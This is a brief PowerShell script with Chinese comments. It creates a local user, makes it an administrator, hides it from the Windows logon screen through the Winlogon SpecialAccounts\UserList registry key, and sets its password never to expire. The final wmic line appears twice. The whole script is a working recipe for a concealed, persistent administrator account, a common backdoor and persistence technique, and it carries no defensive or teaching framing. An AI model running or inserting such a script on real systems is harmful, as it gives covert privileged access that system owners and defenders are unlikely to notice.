$userAcct='userAcct'
$userPass='userPass'
#创建 用户名=userAcct 密码=userPass
net user $userAcct $userPass /add
#将该用户添加为管理员
net localgroup administrators $userAcct /add
#将用户设置为隐藏用户
$regPath="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
If(!(Test-Path $regPath)){mkdir $regpath -Force}
Set-ItemProperty $regPath -Name $userAcct -Value 0
#设置密码永不过期
cmd /c "wmic.exe UserAccount Where Name=`"$userAcct`" Set PasswordExpires=`"false`""




wmic.exe UserAccount Where Name="$userAcct" Set PasswordExpires="false"